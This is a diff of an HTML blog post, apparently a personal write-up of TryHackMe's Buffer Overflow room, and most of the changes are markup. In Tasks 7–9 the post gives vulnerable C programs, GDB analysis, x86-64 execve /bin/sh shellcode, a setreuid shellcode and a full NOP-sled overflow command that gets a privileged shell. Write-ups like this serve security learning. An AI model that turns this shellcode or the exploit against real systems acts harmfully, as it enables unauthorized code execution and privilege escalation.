@@ -1,12 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+<!-- 2026-03-29 Sun 21:03 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>My first (proper?) buffer overflow</title>
 <meta name="author" content="Lamprinos Chatziioannou" />
 <meta name="generator" content="Org Mode" />
-<script src="/src/copy-pre.min.js"></script><script src="/src/theme-switcher.min.js" defer></script><script src="/src/nav.min.js" defer></script><link href="/pagefind/pagefind-ui.css" rel="stylesheet"><script src="/pagefind/pagefind-ui.js"></script><script src="/src/search.min.js" defer></script><link rel="stylesheet" href="/src/rougier.min.css" /><link rel="icon" type="image/x-icon" href="/src/favicon.ico"><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script><meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
+<script src="/src/copy-pre.min.js"></script><script src="/src/theme-switcher.min.js" defer></script><script src="/src/nav.min.js" defer></script><link href="/pagefind/pagefind-ui.css" rel="stylesheet"><script src="/pagefind/pagefind-ui.js"></script><script src="/src/search.min.js" defer></script><link rel="stylesheet" href="/src/rougier.min.css" /><link rel="icon" type="image/x-icon" href="/src/favicon.ico"><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script>
 <script>
   window.MathJax = {
     tex: {
@@ -45,24 +46,27 @@
 <nav class="site-nav"> <div class="nav-header"> <a href="/" class="logo" aria-label="Home"> <span class="site-title">Chasing Simplicity</span> </a> <button id="menu-toggle" aria-label="Toggle menu"> <span class="hamburger"></span> </button> </div> <ul id="nav-menu"> <li><a href="/posts/recents.html" class="active">archive</a></li> <li><a href="/tags/index.html">tags</a></li> <li><a href="/posts/books.html">reading list</a></li> <li><a href="/posts/about.html">about</a></li> <li class="search-item"> <div id="search"></div> </li> <li class="theme-item"> <button id="theme-toggle" aria-label="Toggle theme">dark mode</button> </li> </ul> </nav>
 </div>
 <div id="content" class="content">
+<header>
 <h1 class="title">My first (proper?) buffer overflow</h1>
-<div id="table-of-contents" role="doc-toc">
+<nav class="post-tags">
+<span>Tags:</span> <a href="/tags/tryhackme.html" class="tag">tryhackme</a>
+</nav></header><nav id="table-of-contents" role="doc-toc">
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org289ad3c">Introduction</a></li>
-<li><a href="#orgcd2bbd9">Criticism</a></li>
-<li><a href="#org276906a">Task 7</a></li>
-<li><a href="#org3131e02">Task 8</a></li>
-<li><a href="#orge380e06">Task 9</a></li>
-<li><a href="#orgcaf54b2">In conclusion</a></li>
-<li><a href="#org8693fe4">Links:</a></li>
+<li><a href="#orgf13d963">Introduction</a></li>
+<li><a href="#org02e30f2">Criticism</a></li>
+<li><a href="#orga07a41f">Task 7</a></li>
+<li><a href="#org359158b">Task 8</a></li>
+<li><a href="#org7f2cf65">Task 9</a></li>
+<li><a href="#orgb830b4a">In conclusion</a></li>
+<li><a href="#org35dd166">Links:</a></li>
 </ul>
 </div>
-</div>
-<div id="outline-container-org289ad3c" class="outline-2">
-<h2 id="org289ad3c"><a href="#org289ad3c">Introduction</a></h2>
-<div class="outline-text-2" id="text-org289ad3c">
+</nav>
+<div id="outline-container-orgf13d963" class="outline-2">
+<h2 id="orgf13d963"><a href="#orgf13d963">Introduction</a></h2>
+<div class="outline-text-2" id="text-orgf13d963">
 <p>
 Everyone that works with computers has heard of the term buffer
 overflow. It is not uncommon to cause such an unwanted behavior when
@@ -81,9 +85,9 @@ TryHackMe&rsquo;s Buffer Overflow room, I was stuck.
 </p>
 </div>
 </div>
-<div id="outline-container-orgcd2bbd9" class="outline-2">
-<h2 id="orgcd2bbd9"><a href="#orgcd2bbd9">Criticism</a></h2>
-<div class="outline-text-2" id="text-orgcd2bbd9">
+<div id="outline-container-org02e30f2" class="outline-2">
+<h2 id="org02e30f2"><a href="#org02e30f2">Criticism</a></h2>
+<div class="outline-text-2" id="text-org02e30f2">
 <p>
 I feel that this room could (and should) be improved. While it <b>does</b>
 serve as an introduction to Buffer Overflow, it surely is not a
@@ -96,15 +100,15 @@ It was rather disheartening, to see myself get so stuck.
 </p>
 </div>
 </div>
-<div id="outline-container-org276906a" class="outline-2">
-<h2 id="org276906a"><a href="#org276906a">Task 7</a></h2>
-<div class="outline-text-2" id="text-org276906a">
+<div id="outline-container-orga07a41f" class="outline-2">
+<h2 id="orga07a41f"><a href="#orga07a41f">Task 7</a></h2>
+<div class="outline-text-2" id="text-orga07a41f">
 <p>
 In this task we are asked to get <code>special</code>, instead of <code>normal</code> to
 execute:
 </p>
 <div class="org-src-container">
-<pre class="src src-c" id="org9f1ef60"><span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdlib.h&gt;</span>
+<pre class="src src-c" id="org7c46179"><span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdlib.h&gt;</span>
 <span class="org-preprocessor">#include</span> <span class="org-string">&lt;unistd.h&gt;</span>
 <span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdio.h&gt;</span>
 
@@ -138,7 +142,7 @@ execute:
 Launching GDB:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org072bfa7">gdb ./func-pointer
+<pre class="src src-bash" id="orgeef9dd0">gdb ./func-pointer
 </pre>
 </div>
 
@@ -153,7 +157,7 @@ scratch.
 To view the assembly commands and memory addresses for each function I
 used the following:
 </p>
-<pre class="example" id="orgf537851">
+<pre class="example" id="org5ddd6bd">
 disassemble main
 disassemble special
 disassemble normal
@@ -161,11 +165,11 @@ disassemble normal
 
 
 
-<div id="org2e270cf" class="figure">
-<p><img src="images/Task_7/20231205_142939_screenshot.png" alt="20231205_142939_screenshot.png">
-</p>
-<p><span class="figure-number">Figure 1: </span>Interesting assembly commands and locations</p>
-</div>
+<figure id="org7cfcee1">
+<img src="images/Task_7/20231205_142939_screenshot.png" alt="20231205_142939_screenshot.png">
+
+<figcaption><span class="figure-number">Figure 1: </span>Interesting assembly commands and locations</figcaption>
+</figure>
 
 <p>
 At this point, I knew that the two variables, pointer and buffer were
@@ -211,11 +215,11 @@ It quickly become evident that I was writing in the highlighted area,
 and wanted to change the contents of the &ldquo;circled&rdquo; one&rsquo;s:
 </p>
 
-<div id="orgbd8ec7b" class="figure">
-<p><img src="images/Task_7/20231205_143929_screenshot.png" alt="20231205_143929_screenshot.png">
-</p>
-<p><span class="figure-number">Figure 2: </span>Highlighting memory dump</p>
-</div>
+<figure id="org3230499">
+<img src="images/Task_7/20231205_143929_screenshot.png" alt="20231205_143929_screenshot.png">
+
+<figcaption><span class="figure-number">Figure 2: </span>Highlighting memory dump</figcaption>
+</figure>
 
 <p>
 Unfortunately, I could not get the payload I had created to work
@@ -224,34 +228,34 @@ could see that I modified the target area (first payload), but the
 second one could not work, to set it to its proper value (0x400567)
 </p>
 
-<pre class="example" id="org3d16a60">
+<pre class="example" id="orgf5f81d1">
 AAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAA\x67\x05\x40\x00
 </pre>
 
 
-<div id="org742f2b0" class="figure">
-<p><img src="images/Task_7/20231205_144132_screenshot.png" alt="20231205_144132_screenshot.png">
-</p>
-<p><span class="figure-number">Figure 3: </span>Setting <code>new_ptr</code> to all As</p>
-</div>
+<figure id="orga7b70f1">
+<img src="images/Task_7/20231205_144132_screenshot.png" alt="20231205_144132_screenshot.png">
+
+<figcaption><span class="figure-number">Figure 3: </span>Setting <code>new_ptr</code> to all As</figcaption>
+</figure>
 
 <p>
 To bypass this I relied on <code>echo</code>: 
 </p>
 
 
-<div id="orgaf80a9e" class="figure">
-<p><img src="images/Task_7/20231205_140516_screenshot.png" alt="20231205_140516_screenshot.png">
-</p>
-<p><span class="figure-number">Figure 4: </span>Solution</p>
+<figure id="orgc1427d1">
+<img src="images/Task_7/20231205_140516_screenshot.png" alt="20231205_140516_screenshot.png">
+
+<figcaption><span class="figure-number">Figure 4: </span>Solution</figcaption>
+</figure>
 </div>
 </div>
-</div>
-<div id="outline-container-org3131e02" class="outline-2">
-<h2 id="org3131e02"><a href="#org3131e02">Task 8</a></h2>
-<div class="outline-text-2" id="text-org3131e02">
-<div class="note" id="org2441bc2">
+<div id="outline-container-org359158b" class="outline-2">
+<h2 id="org359158b"><a href="#org359158b">Task 8</a></h2>
+<div class="outline-text-2" id="text-org359158b">
+<div class="note" id="orge05253f">
 <p>
 This was the first buffer overflow I attempted that resulted in the
 execution of a different program for Privilege Escalation. Mistakes
@@ -262,7 +266,7 @@ correct me in the comments.
 </div>
 
 <div class="org-src-container">
-<pre class="src src-c" id="org6e90ada"><span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdio.h&gt;</span>
+<pre class="src src-c" id="orgc3860d4"><span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdio.h&gt;</span>
 <span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdlib.h&gt;</span>
 
 <span class="org-type">void</span> <span class="org-function-name">copy_arg</span>(<span class="org-type">char</span> *<span class="org-variable-name">string</span>)
@@ -315,11 +319,11 @@ you revise assembly. It was fun analyzing where I should look at :P
 
 
 
-<div id="org29c5d76" class="figure">
-<p><img src="images/Task_8/20231205_234129_screenshot.png" alt="20231205_234129_screenshot.png">
-</p>
-<p><span class="figure-number">Figure 5: </span>Filling buffer with A&rsquo;s and checking the return address</p>
-</div>
+<figure id="orgcfbf28f">
+<img src="images/Task_8/20231205_234129_screenshot.png" alt="20231205_234129_screenshot.png">
+
+<figcaption><span class="figure-number">Figure 5: </span>Filling buffer with A&rsquo;s and checking the return address</figcaption>
+</figure>
 
 <p>
 Through experimentation we can understand the following:
@@ -346,11 +350,11 @@ return address &ldquo;populated&rdquo; with As.
 </p>
 
 
-<div id="org89e74c5" class="figure">
-<p><img src="images/Task_8/20231205_234916_screenshot.png" alt="20231205_234916_screenshot.png">
-</p>
-<p><span class="figure-number">Figure 6: </span>Overwritten return address</p>
-</div>
+<figure id="orge0ee8c1">
+<img src="images/Task_8/20231205_234916_screenshot.png" alt="20231205_234916_screenshot.png">
+
+<figcaption><span class="figure-number">Figure 6: </span>Overwritten return address</figcaption>
+</figure>
 
 <p>
 The &rsquo;\x90&rsquo; string is the NOP (no operation) flag, and is extremely
@@ -364,7 +368,7 @@ shellcode, I got the hex shellcode from a writeup to continue. (The
 one in the room did not seem to work). This is 40 bytes.
 </p>
 
-<pre class="example" id="orga8b1857">
+<pre class="example" id="org8ffa133">
 \x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
 </pre>
 
@@ -382,7 +386,7 @@ a shell:
 </ul>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="org1199c46">/home/user1/overflow-3/buffer-overflow $(python -c <span class="org-string">"print ('\x90'*100 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x70\xe3\xff\xff\xff\x7f')"</span>)
+<pre class="src src-bash" id="orgd4f8679">/home/user1/overflow-3/buffer-overflow $(python -c <span class="org-string">"print ('\x90'*100 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x70\xe3\xff\xff\xff\x7f')"</span>)
 </pre>
 </div>
 <ul class="org-ul">
@@ -410,14 +414,14 @@ scope for &ldquo;my investigation&rdquo; to get the shellcode.</li>
 </div>
 </div>
 </div>
-<div id="outline-container-orge380e06" class="outline-2">
-<h2 id="orge380e06"><a href="#orge380e06">Task 9</a></h2>
-<div class="outline-text-2" id="text-orge380e06">
+<div id="outline-container-org7f2cf65" class="outline-2">
+<h2 id="org7f2cf65"><a href="#org7f2cf65">Task 9</a></h2>
+<div class="outline-text-2" id="text-org7f2cf65">
 <p>
 This seems exactly the same as before. Let&rsquo;s see if we can tackle it quickly:
 </p>
 <div class="org-src-container">
-<pre class="src src-c" id="org911465d"><span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdio.h&gt;</span>
+<pre class="src src-c" id="org3af9701"><span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdio.h&gt;</span>
 <span class="org-preprocessor">#include</span> <span class="org-string">&lt;stdlib.h&gt;</span>
 
 <span class="org-type">void</span> <span class="org-function-name">concat_arg</span>(<span class="org-type">char</span> *<span class="org-variable-name">string</span>)
@@ -444,17 +448,17 @@ and the return address.</li>
 </ul>
 
 
-<div id="org8beec7c" class="figure">
-<p><img src="images/Task_9/20231206_002813_screenshot.png" alt="20231206_002813_screenshot.png">
-</p>
-<p><span class="figure-number">Figure 7: </span>Started from the bottom now we here</p>
-</div>
+<figure id="org8e3eab1">
+<img src="images/Task_9/20231206_002813_screenshot.png" alt="20231206_002813_screenshot.png">
+
+<figcaption><span class="figure-number">Figure 7: </span>Started from the bottom now we here</figcaption>
+</figure>
 
 <p>
 I then created the setuid payload once again, and proceeded to
 modify the payload to fit in our example.
 </p>
-<pre class="example" id="org1192353">
+<pre class="example" id="org88a7c51">
 root@ip-10-10-80-64:~# pwn shellcraft -f d amd64.linux.setreuid 1003
 \x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
 </pre>
@@ -497,18 +501,18 @@ to the preceding NOPs)
 </p>
 </div>
 </div>
-<div id="outline-container-orgcaf54b2" class="outline-2">
-<h2 id="orgcaf54b2"><a href="#orgcaf54b2">In conclusion</a></h2>
-<div class="outline-text-2" id="text-orgcaf54b2">
+<div id="outline-container-orgb830b4a" class="outline-2">
+<h2 id="orgb830b4a"><a href="#orgb830b4a">In conclusion</a></h2>
+<div class="outline-text-2" id="text-orgb830b4a">
 <p>
 This might be one of the best rooms I have ever checked out and I am
 glad I did.
 </p>
 </div>
 </div>
-<div id="outline-container-org8693fe4" class="outline-2">
-<h2 id="org8693fe4"><a href="#org8693fe4">Links:</a></h2>
-<div class="outline-text-2" id="text-org8693fe4">
+<div id="outline-container-org35dd166" class="outline-2">
+<h2 id="org35dd166"><a href="#org35dd166">Links:</a></h2>
+<div class="outline-text-2" id="text-org35dd166">
 <p>
 Although I usually keep myself from searching for walkthroughs and
 solutions, this time, partly due to the insufficiency of the
